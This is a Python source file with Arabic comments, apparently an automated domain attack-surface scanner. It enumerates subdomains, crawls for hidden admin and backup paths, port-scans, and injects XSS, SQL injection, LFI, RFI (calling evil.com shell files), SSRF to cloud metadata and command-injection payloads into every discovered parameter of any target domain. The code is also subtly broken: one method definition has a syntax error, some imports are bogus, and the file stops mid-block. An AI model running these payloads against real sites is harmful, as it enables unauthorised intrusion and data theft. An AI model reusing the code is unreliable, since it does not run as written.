#!/usr/bin/env python3
"""
Domain Security Scanner - أداة فحص أمنية شاملة للدومينات
المبرمج: SaudiLinux
البريد الإلكتروني: SaudiLinux1@gmail.com
تقوم الأداة باستخراج النطاقات الفرعية والروابط المخفية وفحص الثغرات الأمنية الشائعة
"""

import requests
import re
import json
import socket
import ssl
import dns.resolver
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup
import argparse
import sys
import time
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
import whois
from wafw00f.main import main as wafw00f_main
import sslscan
import nmap
import censys
import shodan

class DomainSecurityScanner:
    def __init__(self, domain, threads=10, timeout=10):
        self.domain = domain
        self.base_url = f"https://{domain}" if not domain.startswith(('http://', 'https://')) else domain
        self.parsed_url = urlparse(self.base_url)
        self.domain_name = self.parsed_url.netloc or domain
        self.threads = threads
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        })
        self.subdomains = set()
        self.hidden_links = set()
        self.vulnerabilities = []
        self.visited_urls = set()
        self.js_files = set()
        self.api_endpoints = set()
        
        # قوالب الثغرات الشائعة
        self.vulnerability_templates = self._load_vulnerability_templates()

    def _load_vulnerability_templates(self):
        """تحميل قوالب الثغرات الأمنية"""
        return {
            'xss': {
                'name': 'Cross-Site Scripting (XSS)',
                'severity': 'عالية',
                'description': 'ثغرة تسمح بحقن كود جافاسكريبت في الصفحة',
                'payloads': ['<script>alert(1)</script>', '"><script>alert(1)</script>'],
                'patterns': [r'<script>alert\(1\)</script>']
            },
            'sqli': {
                'name': 'SQL Injection',
                'severity': 'حرجة',
                'description': 'ثغرة تسمح بتنفيذ استعلامات SQL عشوائية على قاعدة البيانات',
                'payloads': ["' OR '1'='1", "' AND SLEEP(5)--", "' UNION SELECT 1,2,3--"],
                'patterns': [r'mysql.*error|sql.*error|syntax.*error', r'MySQL.*server']
            },
            'lfi': {
                'name': 'Local File Inclusion',
                'severity': 'عالية',
                'description': 'ثغرة تسمح بقراءة ملفات محلية من الخادم',
                'payloads': ['../../etc/passwd', '....//....//etc/passwd', 'file:///etc/passwd'],
                'patterns': [r'root:x:0:0:root', r'\[apache\]', r'\[nginx\]']
            },
            'rfi': {
                'name': 'Remote File Inclusion',
                'severity': 'حرجة',
                'description': 'ثغرة تسمح بتحميل وتنفيذ ملفات من مواقع بعيدة',
                'payloads': ['http://evil.com/shell.txt', 'https://attacker.com/malicious.php'],
                'patterns': []
            },
            'ssrf': {
                'name': 'Server-Side Request Forgery',
                'severity': 'عالية',
                'description': 'ثغرة تسمح للخادم بإجراء طلبات HTTP غير مصرح بها',
                'payloads': ['http://127.0.0.1:22', 'http://localhost:3306', 'http://169.254.169.254/latest/meta-data/'],
                'patterns': []
            },
            'open_redirect': {
                'name': 'Open Redirect',
                'severity': 'متوسطة',
                'description': 'ثغرة تسمح بإعادة توجيه المستخدمين إلى مواقع ضارة',
                'payloads': ['//evil.com', 'https://evil.com', 'javascript:alert(1)'],
                'patterns': []
            },
            'cmd_injection': {
                'name': 'Command Injection',
                'severity': 'حرجة',
                'description': 'ثغرة تسمح بتنفيذ أوامر النظام على الخادم',
                'payloads': [';id', '|whoami', '`id`', '$(whoami)'],
                'patterns': [r'uid=\d+.*gid=', r'nt authority\\system', r'root:x:']
            },
            'xxe': {
                'name': 'XML External Entity',
                'severity': 'عالية',
                'description': 'ثغرة تسمح بقراءة الملفات والقيام بـ SSRF من خلال معالجة XML',
                'payloads': ['<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'],
                'patterns': [r'root:x:0:0:root']
            },
            'cors': {
                'name': 'Misconfigured CORS',
                'severity': 'متوسطة',
                'description': 'إعدادات CORS خاطئة تسمح بالوصول غير المصرح به',
                'patterns': [r'Access-Control-Allow-Origin: \*', r'Access-Control-Allow-Credentials: true']
            },
            'csrf': {
                'name': 'Missing CSRF Protection',
                'severity': 'متوسطة',
                'description': 'عدم وجود حماية ضد هجمات CSRF في النماذج',
                'patterns': []
            }
        }

    def print_banner(self):
        """عرض شعار الأداة"""
        banner = f"""
╔══════════════════════════════════════════════════════════════════════════════╗
║  DOMAIN SECURITY SCANNER v2.0                                              ║
║  المبرمج: SaudiLinux                                                         ║
║  البريد الإلكتروني: SaudiLinux1@gmail.com                                    ║
╚══════════════════════════════════════════════════════════════════════════════╝
[+] بدء الفحص للدومين: {self.domain_name}
[+] تاريخ ووقت البدء: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
[+] عدد الخيوط المتزامنة: {self.threads}
"""
        print(banner)

    def enumerate_subdomains(self):
        """استخراج جميع النطاقات الفرعية للدومين"""
        print("\n[*] بدء استخراج النطاقات الفرعية...")
        
        # قائمة كلمات مفتاحية للنطاقات الفرعية الشائعة
        subdomain_wordlist = [
            'www', 'mail', 'ftp', 'localhost', 'webmail', 'smtp', 'pop', 'ns1', 'webdisk',
            'ns2', 'cpanel', 'whm', 'autodiscover', 'autoconfig', 'm', 'shop', 'mail2',
            'test', 'dev', 'beta', 'staging', 'admin', 'portal', 'blog', 'forum', 'app',
            'api', 'dev', 'stage', 'prod', 'production', 'uat', 'qa', 'internal',
            'vpn', 'remote', 'citrix', 'owa', 'exchange', 'sharepoint', 'wp', 'wordpress',
            'cp', 'dashboard', 'manage', 'manager', 'panel', 'host', 'cloud', 'cdn',
            'static', 'assets', 'media', 'images', 'img', 'download', 'uploads', 'files',
            'docs', 'documentation', 'wiki', 'kb', 'help', 'support', 'status', 'monitor',
            'metrics', 'grafana', 'kibana', 'elastic', 'search', 'db', 'database', 'mysql',
            'postgres', 'mongo', 'redis', 'cache', 'redis', 'rabbitmq', 'kafka', 'jenkins',
            'ci', 'cd', 'gitlab', 'github', 'bitbucket', 'git', 'svn', 'jira', 'confluence',
            'atlassian', 'zendesk', 'intercom', 'stripe', 'paypal', 'payment', 'checkout',
            'billing', 'invoice', 'account', 'accounts', 'user', 'users', 'member', 'members',
            'auth', 'login', 'signup', 'register', 'logout', 'signin', 'oauth', 'sso',
            'cas', 'ldap', 'saml', 'secure', 'ssl', 'tls', 'cert', 'certs', 'certificate',
            'stage', 'demo', 'sandbox', 'test', 'dev', 'development', 'local', 'internal',
            'private', 'corp', 'company', 'intranet', 'extranet', 'partner', 'partners',
            'vendor', 'vendors', 'supplier', 'suppliers', 'client', 'clients', 'customer',
            'customers', 'en', 'ar', 'fr', 'de', 'es', 'us', 'uk', 'eu', 'www2', 'www3'
        ]

        # إضافة النطاق الرئيسي
        self.subdomains.add(self.domain_name)
        
        # الفحص المتعدد الخيوط للنطاقات الفرعية
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = []
            for sub in subdomain_wordlist:
                full_domain = f"{sub}.{self.domain_name}" if self.domain_name not in sub else sub
                futures.append(executor.submit(self._check_subdomain, full_domain))
            
            for future in as_completed(futures):
                try:
                    result = future.result()
                    if result:
                        self.subdomains.add(result)
                        print(f"  [+] تم اكتشاف نطاق فرعي: {result}")
                except Exception as e:
                    pass

        # محاولة استخراج سجلات DNS
        self._dns_enumeration()
        
        # استخدام واجهات برمجة التطبيقات العامة للعثور على نطاقات فرعية إضافية
        self._crtsh_enumeration()
        self._virustotal_enumeration()
        
        print(f"\n[+] تم العثور على إجمالي {len(self.subdomains)} نطاق فرعي")
        return list(self.subdomains)

    def _check_subdomain(self, domain):
        """التحقق من وجود نطاق فرعي عبر DNS"""
        try:
            answers = dns.resolver.resolve(domain, 'A')
            if answers:
                return domain
        except:
            return None

    def _dns_enumeration(self):
        """استخراج جميع سجلات DNS للدومين"""
        record_types = ['A', 'AAAA', 'MX', 'NS', 'TXT', 'SOA', 'CNAME', 'PTR', 'SRV', 'CAA']
        print("\n[*] فحص سجلات DNS للدومين...")
        
        for rtype in record_types:
            try:
                answers = dns.resolver.resolve(self.domain_name, rtype)
                for rdata in answers:
                    if rtype in ['MX', 'CNAME']:
                        extracted_domain = str(rdata.exchange).rstrip('.') if rtype == 'MX' else str(rdata.target).rstrip('.')
                        if extracted_domain.endswith(self.domain_name):
                            self.subdomains.add(extracted_domain)
                            print(f"  [+] نطاق من سجل {rtype}: {extracted_domain}")
                    elif rtype == 'TXT':
                        # البحث عن أسماء نطاقات في سجلات TXT
                        txt_content = str(rdata).strip('"')
                        domains_found = re.findall(rf'([a-zA-Z0-9-]+\.{self.domain_name})', txt_content)
                        for d in domains_found:
                            if d not in self.subdomains:
                                self.subdomains.add(d)
                                print(f"  [+] نطاق من سجل TXT: {d}")
            except Exception:
                continue

    def _crtsh_enumeration):
        """استخراج النطاقات الفرعية من crt.sh (شهادات SSL)"""
        try:
            print("\n[*] البحث في crt.sh عن شهادات SSL...")
            url = f"https://crt.sh/?q=%.{self.domain_name}&output=json"
            response = self.session.get(url, timeout=self.timeout)
            if response.status_code == 200:
                data = response.json()
                for entry in data:
                    name_value = entry.get('name_value', '')
                    domains = name_value.split('\n')
                    for domain in domains:
                        domain = domain.strip().lstrip('*.')
                        if domain and domain.endswith(self.domain_name) and domain not in self.subdomains:
                            try:
                                socket.gethostbyname(domain)
                                self.subdomains.add(domain)
                                print(f"  [+] نطاق من crt.sh: {domain}")
                            except:
                                pass
        except Exception as e:
            print(f"  [!] خطأ في crt.sh: {e}")

    def _virustotal_enumeration(self):
        """استخراج النطاقات الفرعية من VirusTotal (إذا كان المفتاح متوفراً)"""
        # يمكن إضافة مفتاح API هنا للاستفادة الكاملة
        pass

    def crawl_and_extract_links(self):
        """الزحف على الموقع واستخراج جميع الروابط المخفية"""
        print("\n[*] بدء الزحف واستخراج الروابط من الموقع...")
        
        queue = [self.base_url]
        self.visited_urls.add(self.base_url)
        
        # أنماط للعثور على روابط مخفية ونقاط نهاية API
        hidden_path_patterns = [
            r'/admin[^\s"\']*', r'/api[^\s"\']*', r'/v\d+/[^\s"\']*', r'/graphql',
            r'/wp-json[^\s"\']*', r'/\.well-known[^\s"\']*', r'/backup[^\s"\']*',
            r'/old[^\s"\']*', r'/temp[^\s"\']*', r'/test[^\s"\']*', r'/dev[^\s"\']*',
            r'/staging[^\s"\']*', r'/beta[^\s"\']*', r'/debug[^\s"\']*', r'/config[^\s"\']*',
            r'/settings[^\s"\']*', r'/backup[^\s"\']*', r'/dump[^\s"\']*', r'/sql[^\s"\']*',
            r'/db[^\s"\']*', r'/database[^\s"\']*', r'/private[^\s"\']*', r'/internal[^\s"\']*',
            r'/secret[^\s"\']*', r'/hidden[^\s"\']*', r'/cms[^\s"\']*', r'/wp-admin[^\s"\']*',
            r'/phpmyadmin[^\s"\']*', r'/pma[^\s"\']*', r'/adminer[^\s"\']*', r'/cloudpanel[^\s"\']*',
            r'/cpanel[^\s"\']*', r'/whm[^\s"\']*', r'/webmin[^\s"\']*', r'/minimal[^\s"\']*',
            r'/jenkins[^\s"\']*', r'/gitlab[^\s"\']*', r'/grafana[^\s"\']*', r'/kibana[^\s"\']*',
            r'/elasticsearch[^\s"\']*', r'/rabbitmq[^\s"\']*', r'/redis[^\s"\']*', r'/solr[^\s"\']*',
            r'/actuator[^\s"\']*', r'/health[^\s"\']*', r'/metrics[^\s"\']*', r'/status[^\s"\']*',
            r'/swagger[^\s"\']*', r'/docs[^\s"\']*', r'/readme[^\s"\']*', r'/changelog[^\s"\']*',
            r'/CHANGELOG[^\s"\']*', r'/license[^\s"\']*', r'/LICENSE[^\s"\']*', r'/todo[^\s"\']*',
            r'/TODO[^\s"\']*', r'/.git[^\s"\']*', r'/.svn[^\s"\']*', r'/.hg[^\s"\']*',
            r'/composer\.json', r'/package\.json', r'/package-lock\.json', r'/yarn\.lock',
            r'/webpack\.config\.js', r'/nginx\.conf', r'/httpd\.conf', r'/\.env', r'/.env\.',
            r'/config\.json', r'/config\.yml', r'/config\.yaml', r'/config\.ini', r'/config\.php',
            r'/settings\.json', r'/db\.sql', r'/dump\.sql', r'/backup\.sql', r'/database\.sql',
            r'/readme\.md', r'/README\.md', r'/install\.php', r'/setup\.php', r'/update\.php',
            r'/upload\.php', r'/download\.php', r'/export\.php', r'/import\.php', r'/shell\.php',
            r'/cmd\.php', r'/backup\.zip', r'/archive\.zip', r'/backup\.tar\.gz', r'/backup\.rar',
            r'/\.DS_Store', r'/Thumbs\.db', r'/error_log', r'/access_log', r'/debug\.log',
            r'/phpinfo\.php', r'/info\.php', r'/test\.php', r'/check\.php', r'/probe\.php',
            r'/benchmark\.php', r'/stress\.php', r'/load\.php', r'/ping\.php', r'/fuzz\.php'
        ]

        compiled_patterns = [re.compile(pattern) for pattern in hidden_path_patterns]
        
        while queue:
            current_url = queue.pop(0)
            try:
                response = self.session.get(current_url, timeout=self.timeout, allow_redirects=True)
                if 'text/html' not in response.headers.get('content-type', ''):
                    # إذا كان ملف جافاسكريبت، قم بتحليله للبحث عن روابط
                    if current_url.endswith('.js'):
                        self.js_files.add(current_url)
                        self._extract_links_from_js(response.text, current_url, queue, compiled_patterns)
                    continue
                
                soup = BeautifulSoup(response.text, 'html.parser')
                
                # استخراج جميع الروابط من الصفحة
                for link in soup.find_all('a', href=True):
                    full_url = urljoin(current_url, link['href'])
                    self._process_url(full_url, queue)
                
                # استخراج الروابط من سمات البيانات الأخرى
                for tag in soup.find_all(True):
                    for attr in ['src', 'data-src', 'data-url', 'action', 'formaction', 'href']:
                        if tag.has_attr(attr):
                            full_url = urljoin(current_url, tag[attr])
                            self._process_url(full_url, queue)
                
                # البحث عن الروابط المخفية في محتوى الصفحة
                page_content = response.text
                for pattern in compiled_patterns:
                    matches = pattern.findall(page_content)
                    for match in matches:
                        hidden_url = urljoin(self.base_url, match)
                        if hidden_url not in self.hidden_links and hidden_url not in self.visited_urls:
                            self.hidden_links.add(hidden_url)
                            print(f"    [+] رابط مخفي تم اكتشافه: {hidden_url}")
                
            except Exception as e:
                continue

        print(f"\n[+] تم استخراج إجمالي {len(self.hidden_links)} رابط مخفي")
        print(f"[+] تم العثور على {len(self.js_files)} ملف جافاسكريبت")
        return list(self.hidden_links)

    def _extract_links_from_js(self, js_content, base_url, queue, patterns):
        """استخراج الروابط من ملفات الجافاسكريبت"""
        # البحث عن أي URI في الكود
        url_pattern = r'["\'](\/[^"\']+|https?://[^"\']+)["\']'
        matches = re.findall(url_pattern, js_content)
        for match in matches:
            full_url = urljoin(base_url, match)
            self._process_url(full_url, queue)
        
        # البحث عن نقاط نهاية API
        api_patterns = [
            r'fetch\(["\']([^"\']+)["\']', r'axios\.(get|post|put|delete)\(["\']([^"\']+)["\']',
            r'\.ajax\({.*url:\s*["\']([^"\']+)["\']', r'new XMLHttpRequest.*open[\s\S]*?["\']([^"\']+)["\']'
        ]
        for pattern in api_patterns:
            api_matches = re.findall(pattern, js_content)
            for api_match in api_matches:
                api_url = api_match[1] if isinstance(api_match, tuple) else api_match
                full_api_url = urljoin(base_url, api_url)
                if full_api_url not in self.api_endpoints:
                    self.api_endpoints.add(full_api_url)
                    print(f"    [+] نقطة نهاية API تم اكتشافها: {full_api_url}")

    def _process_url(self, url, queue):
        """معالجة الرابط المستخرج وإضافته إلى قائمة الانتظار إذا لزم الأمر"""
        if url not in self.visited_urls and urlparse(url).netloc == self.domain_name:
            self.visited_urls.add(url)
            if url.endswith(('.html', '.htm', '.php', '.asp', '.aspx', '.js', '.do')):
                queue.append(url)

    def scan_vulnerabilities(self):
        """فحص جميع الروابط المكتشفة للثغرات الأمنية"""
        print("\n[*] بدء فحص الثغرات الأمنية للروابط المكتشفة...")
        
        # جمع جميع الروابط التي تحتاج إلى فحص
        all_urls = list(self.visited_urls) + list(self.hidden_links) + list(self.api_endpoints)
        all_urls = list(set(all_urls))  # إزالة التكرارات
        
        print(f"[+] عدد الروابط التي سيتم فحصها: {len(all_urls)}")
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = []
            for url in all_urls:
                futures.append(executor.submit(self._test_url_vulnerabilities, url))
            
            for future in as_completed(futures):
                try:
                    result = future.result()
                    if result:
                        for vuln in result:
                            self.vulnerabilities.append(vuln)
                            print(f"  [⚠️] ثغرة مكتشفة في {vuln['url']}:")
                            print(f"      النوع: {vuln['type']}")
                            print(f"      الخطورة: {vuln['severity']}")
                            print(f"      الوصف: {vuln['description']}\n")
                except Exception as e:
                    pass

        return self.vulnerabilities

    def _test_url_vulnerabilities(self, url):
        """فحص ثغرات محددة في رابط معين"""
        vulnerabilities = []
        parsed = urlparse(url)
        query_params = self._extract_query_params(url)
        
        # فحص CORS
        cors_issue = self._test_cors(url)
        if cors_issue:
            vulnerabilities.append(cors_issue)
        
        # فحص CSRF في النماذج
        if url.endswith(('.php', '.html', '.htm', '/')):
            csrf_issue = self._test_csrf(url)
            if csrf_issue:
                vulnerabilities.append(csrf_issue)
        
        # اختبار الثغرات في معلمات الاستعلام
        for param in query_params:
            # فحص XSS
            xss_result = self._test_xss(url, param)
            if xss_result:
                vulnerabilities.append(xss_result)
            
            # فحص SQL Injection
            sqli_result = self._test_sqli(url, param)
            if sqli_result:
                vulnerabilities.append(sqli_result)
            
            # فحص LFI/RFI
            lfi_result = self._test_lfi(url, param)
            if lfi_result:
                vulnerabilities.append(lfi_result)
            
            # فحص Command Injection
            cmd_result = self._test_command_injection(url, param)
            if cmd_result:
                vulnerabilities.append(cmd_result)
            
            # فحص SSRF
            ssrf_result = self._test_ssrf(url, param)
            if ssrf_result:
                vulnerabilities.append(ssrf_result)
            
            # فحص Open Redirect
            redirect_result = self._test_open_redirect(url, param)
            if redirect_result:
                vulnerabilities.append(redirect_result)
        
        return vulnerabilities

    def _extract_query_params(self, url):
        """استخراج جميع معلمات الاستعلام من الرابط"""
        params = []
        parsed = urlparse(url)
        if parsed.query:
            for param_pair in parsed.query.split('&'):
                if '=' in param_pair:
                    param_name = param_pair.split('=')[0]
                    if param_name not in params:
                        params.append(param_name)
        return params

    def _test_cors(self, url):
        """فحص إعدادات CORS"""
        try:
            headers = {'Origin': 'https://evil.com'}
            response = self.session.get(url, headers=headers, timeout=self.timeout)
            acao = response.headers.get('Access-Control-Allow-Origin', '')
            acac = response.headers.get('Access-Control-Allow-Credentials', '')
            
            if acao == '*' or (acao == 'https://evil.com' and acac == 'true'):
                return {
                    'url': url,
                    'type': self.vulnerability_templates['cors']['name'],
                    'severity': self.vulnerability_templates['cors']['severity'],
                    'description': self.vulnerability_templates['cors']['description'],
                    'details': f"يسمح الموقع بطلبات من أصل غير مصرح به: {acao}"
                }
        except Exception:
            return None

    def _test_csrf(self, url):
        """فحص وجود حماية CSRF في النماذج"""
        try:
            response = self.session.get(url, timeout=self.timeout)
            soup = BeautifulSoup(response.text, 'html.parser')
            forms = soup.find_all('form')
            
            for form in forms:
                has_csrf = False
                # البحث عن رموز CSRF الشائعة
                csrf_fields = ['csrf', 'token', 'nonce', '_token', 'csrf-token', 'xsrf-token']
                for input_tag in form.find_all('input'):
                    input_name = input_tag.get('name', '').lower()
                    input_id = input_tag.get('id', '').lower()
                    if any(csrf in input_name for csrf in csrf_fields) or any(csrf in input_id for csrf in csrf_fields):
                        has_csrf = True
                        break
                
                if not has_csrf and form.get('method', '').lower() == 'post':
                    return {
                        'url': url,
                        'type': self.vulnerability_templates['csrf']['name'],
                        'severity': self.vulnerability_templates['csrf']['severity'],
                        'description': self.vulnerability_templates['csrf']['description'],
                        'details': "يحتوي النموذج على طريقة POST بدون رمز CSRF"
                    }
        except Exception:
            return None

    def _test_xss(self, url, param):
        """فحص ثغرة XSS"""
        template = self.vulnerability_templates['xss']
        for payload in template['payloads']:
            try:
                test_url = self._replace_query_param(url, param, payload)
                response = self.session.get(test_url, timeout=self.timeout)
                if payload in response.text:
                    return {
                        'url': url,
                        'type': template['name'],
                        'severity': template['severity'],
                        'description': template['description'],
                        'details': f"تم حقن الحملة بنجاح في المعلمة {param}: {payload}"
                    }
            except Exception:
                continue
        return None

    def _test_sqli(self, url, param):
        """فحص ثغرة SQL Injection"""
        template = self.vulnerability_templates['sqli']
        # اختبار payloadات مختلفة
        for payload in template['payloads']:
            try:
                test_url = self._replace_query_param(url, param, payload)
                start_time = time.time()
                response = self.session.get(test_url, timeout=self.timeout)
                response_time = time.time() - start_time
                
                # التحقق من أخطاء SQL أو تأخير الوقت
                for pattern in template['patterns']:
                    if re.search(pattern, response.text, re.IGNORECASE):
                        return {
                            'url': url,
                            'type': template['name'],
                            'severity': template['severity'],
                            'description': template['description'],
                            'details': f"تم اكتشاف خطأ SQL في المعلمة {param} باستخدام الحملة: {payload}"
                        }
                # إذا كان هناك تأخير كبير (لـ SLEEP)
                if 'SLEEP' in payload and response_time > 4:
                    return {
                        'url': url,
                        'type': template['name'],
                        'severity': template['severity'],
                        'description': template['description'],
                        'details': f"اكتشاف ثغرة SQL Injection في المعلمة {param} من خلال تأخير الاستجابة"
                    }
            except requests.exceptions.Timeout:
                if 'SLEEP' in payload:
                    return {
                        'url': url,
                        'type': template['name'],
                        'severity': template['severity'],
                        'description': template['description'],
                        'details': f"انتهت مهلة الطلب مما يشير إلى احتمال وجود SQL Injection في المعلمة {param}"
                    }
            except Exception:
                continue
        return None

    def _test_lfi(self, url, param):
        """فحص ثغرة Local File Inclusion"""
        template = self.vulnerability_templates['lfi']
        for payload in template['payloads']:
            try:
                test_url = self._replace_query_param(url, param, payload)
                response = self.session.get(test_url, timeout=self.timeout)
                for pattern in template['patterns']:
                    if re.search(pattern, response.text):
                        return {
                            'url': url,
                            'type': template['name'],
                            'severity': template['severity'],
                            'description': template['description'],
                            'details': f"تم قراءة ملف محلي في المعلمة {param} باستخدام الحملة: {payload}"
                        }
            except Exception:
                continue
        return None

    def _test_command_injection(self, url, param):
        """فحص ثغرة Command Injection"""
        template = self.vulnerability_templates['cmd_injection']
        for payload in template['payloads']:
            try:
                test_url = self._replace_query_param(url, param, payload)
                response = self.session.get(test_url, timeout=self.timeout)
                for pattern in template['patterns']:
                    if re.search(pattern, response.text):
                        return {
                            'url': url,
                            'type': template['name'],
                            'severity': template['severity'],
                            'description': template['description'],
                            'details': f"تم تنفيذ أمر النظام بنجاح في المعلمة {param} باستخدام الحملة: {payload}"
                        }
            except Exception:
                continue
        return None

    def _test_ssrf(self, url, param):
        """فحص ثغرة SSRF"""
        template = self.vulnerability_templates['ssrf']
        for payload in template['payloads']:
            try:
                test_url = self._replace_query_param(url, param, payload)
                # يمكن إضافة فحص أكثر تفصيلاً بناءً على ردود الخادم
                response = self.session.get(test_url, timeout=self.timeout)
                # هنا يمكن تحليل الاستجابة لاكتشاف ما إذا كانت قد عادت ببيانات من الخدمات الداخلية
                if '169.254.169.254' in payload and ('instance-id' in response.text or 'ami-id' in response.text):
                    return {
                        'url': url,
                        'type': template['name'],
                        'severity': template['severity'],
                        'description': template['description'],
                        'details': f"تم الوصول إلى خدمة AWS Metadata في المعلمة {param}"
                    }
            except Exception:
                continue
        return None

    def _test_open_redirect(self, url, param):
        """فحص ثغرة Open Redirect"""
        template = self.vulnerability_templates['open_redirect']
        for payload in template['payloads']:
            try:
                if 'javascript:' not in payload:  # تجنب javascript لاختبار HTTP فقط
                    test_url = self._replace_query_param(url, param, payload)
                    response = self.session.get(test_url, timeout=self.timeout, allow_redirects=False)
                    if response.status_code in [301, 302, 307, 308] and payload in response.headers.get('Location', ''):
                        return {
                            'url': url,
                            'type': template['name'],
                            'severity': template['severity'],
                            'description': template['description'],
                            'details': f"يتم إعادة التوجيه بنجاح إلى {payload} في المعلمة {param}"
                        }
            except Exception:
                continue
        return None

    def _replace_query_param(self, url, param_name, new_value):
        """استبدال قيمة معلمة استعلام في الرابط"""
        from urllib.parse import urlparse, parse_qs, urlencode
        
        parsed = urlparse(url)
        query_dict = parse_qs(parsed.query)
        
        if param_name in query_dict:
            query_dict[param_name] = [new_value]
            new_query = urlencode(query_dict, doseq=True)
            new_url = parsed._replace(query=new_query).geturl()
            return new_url
        else:
            # إضافة المعلمة إذا لم تكن موجودة
            separator = '&' if parsed.query else '?'
            return f"{url}{separator}{param_name}={new_value}"

    def port_scan(self):
        """فحص المنافذ المفتوحة على الخادم"""
        print("\n[*] بدء فحص المنافذ...")
        common_ports = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 587, 993, 995, 1433, 1521, 3306, 3389, 5432, 5900, 5901, 6379, 8080, 8443, 8888, 9000, 9090, 9200, 27017]
        open_ports = []
        
        def scan_port(port):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                result = sock.connect_ex((self.domain_name, port))
                if result == 0:
                    open_ports.append(port)
                    return port
                sock.close()
            except:
                return None
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = [executor.submit(scan_port, port) for port in common_ports]
            for future in as_completed(futures):
                port = future.result()
                if port:
                    print(f"  [+] المنفذ {port} مفتوح")
        
        print(f"\n[+] تم العثور على {len(open_ports)} منفذ مفتوح")
        return open_ports

    def ssl_analysis(self):
        """تحليل إعدادات SSL/TLS"""
        print("\n[*] بدء تحليل شهادة SSL...")
        ssl_issues = []
        
        try:
            context = ssl.create_default_context()
            with socket.create_connection((self.domain_name, 443), timeout=self.timeout) as sock:
                with context.wrap_socket(sock, server_hostname=self.domain_name) as ssock:
                    cert = ssock.getpeercert()
                    
                    # فحص صلاحية الشهادة
                    not_after = ssl.cert_time_to_seconds(cert['notAfter'])
                    current_time = time.time()
                    if not_after < current_time:
                        ssl_issues.append("الشهادة منتهية الصلاحية")
                    
                    # فحص البروتوكولات
                    version = ssock.version()
                    if version in ['TLSv1', 'TLSv1.1']:
                        ssl_issues.append(f"إصدار TLS قديم: {version} - يجب الترقية إلى TLS 1.2 أو أحدث")
                    
                    # فحص اسم المجال
                    if not ssl.match_hostname(cert, self.domain_name):
                        ssl_issues.append("اسم الدومين لا يتطابق مع الشهادة")
                    
                    print(f"  [+] إصدار SSL/TLS المستخدم: {version}")
                    print(f"  [+] تاريخ انتهاء الشهادة: {cert['notAfter']}")
                    
                    if ssl_issues:
                        print("\n  [!] المشكلات المكتشفة في SSL:")
                        for issue in ssl_issues:
                            print(f"      - {issue}")
                    
                    return ssl_issues
        except Exception as e:
            print(f"  [!] فشل تحليل SSL: {e}")
            return []

    def waf_detection(self):
        """اكتشاف وجود جدار حماية تطبيقات الويب (WAF)"""
        print("\n[*] محاولة اكتشاف WAF...")
        try:
            # استدعاء wafw00f للكشف عن WAF
            # ملاحظة: تتطلب تثبيت wafw00f أولاً
            print("  [+] لاستخدام هذه الميزة، قم بتثبيت wafw00f: pip install wafw00f")
        except Exception as e:
            print(f"  [!] فشل اكتشاف WAF: {e}")

    def generate_report(self, output_file=None):
        """إنشاء تقرير شامل بنتائج الفحص"""
        report = {
            'scan_info': {
                'domain': self.domain_name,
                'scan_date': datetime.now().isoformat(),
                'scanner_version': '2.0',
                'programmer': 'SaudiLinux',
                'email': 'SaudiLinux1@gmail.com'
            },
            'subdomains': list(self.subdomains),
            'hidden_links': list(self.hidden_links),
            'api_endpoints': list(self.api_endpoints),
            'js_files': list(self.js_files),
            'visited_urls': list(self.visited_urls),
            'vulnerabilities': self.vulnerabilities,
            'vulnerability_summary': self._generate_vulnerability_summary()
        }
        
        # عرض ملخص النتائج
        print("\n" + "="*70)
        print("📊 ملخص نتائج الفحص الأمني")
        print("="*70)
        print(f"الدومين المفحوص: {self.domain_name}")
        print(f"تاريخ الفحص: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"\nالإحصائيات:")
        print(f"  • عدد النطاقات الفرعية المكتشفة: {len(self.subdomains)}")
        print(f"  • عدد الروابط المخفية المكتشفة: {len(self.hidden_links)}")
        print(f"  • عدد نقاط نهاية API: {len(self.api_endpoints)}")
        print(f"  • إجمالي الروابط التي تم زيارتها: {len(self.visited_urls)}")
        print(f"  • عدد الثغرات المكتشفة: {len(self.vulnerabilities)}")
        
        if self.vulnerabilities:
            print("\n⚠️ ملخص الثغرات حسب الخطورة:")
            severity_counts = report['vulnerability_summary']
            for severity, count in severity_counts.items():
                if count > 0:
                    print(f"  • {severity}: {count} ثغرة")
            
            print("\n📋 قائمة بالثغرات المكتشفة:")
            for i, vuln in enumerate(self.vulnerabilities, 1):
                print(f"{i}. {vuln['type']} - {vuln['severity']}")
                print(f"   الرابط: {vuln['url']}")
                print(f"   التفاصيل: {vuln['details']}\n")
        
        # حفظ التقرير في ملف إذا تم تحديده
        if output_file:
            with open(output_file, 'w', encoding='utf-8') as f:
                json.dump(report, f, ensure_ascii=False, indent=2)
            print(f"\n[+] تم حفظ التقرير الكامل في: {output_file}")
        
        return report

    def _generate_vulnerability_summary(self):
        """إنشاء ملخص للثغرات حسب الخطورة"""
        summary = {
            'حرجة': 0,
            'عالية': 0,
            'متوسطة': 0,
            'منخفضة': 0
        }
        for vuln in self.vulnerabilities:
            severity = vuln['severity']
            if severity in summary:
                summary[severity] += 1
        return summary

    def run_full_scan(self, output_file=None):
        """تشغيل جميع عمليات الفحص بشكل متسلسل"""
        self.print_banner()
        
        try:
            # الخطوة 1: استخراج النطاقات الفرعية
            self.enumerate_subdomains()
            
            # الخطوة 2: الزحف واستخراج الروابط
            self.crawl_and_extract_links()
            
            # الخطوة 3: فحص المنافذ
            self.port_scan()
            
            # الخطوة 4: تحليل SSL
            self.ssl_analysis()
            
            # الخطوة 5: اكتشاف WAF
            self.waf_detection()
            
            # الخطوة 6: فحص الثغرات
            self.scan_vulnerabilities()
            
            # إنشاء التقرير النهائي
            self.generate_report(output_file)
            
            print("\n✅ اكتمل الفحص الأمني بنجاح!")
            print(f"المبرمج: SaudiLinux")
            print(f"للتواصل: SaudiLinux1@gmail.com")
            
        except KeyboardInterrupt:
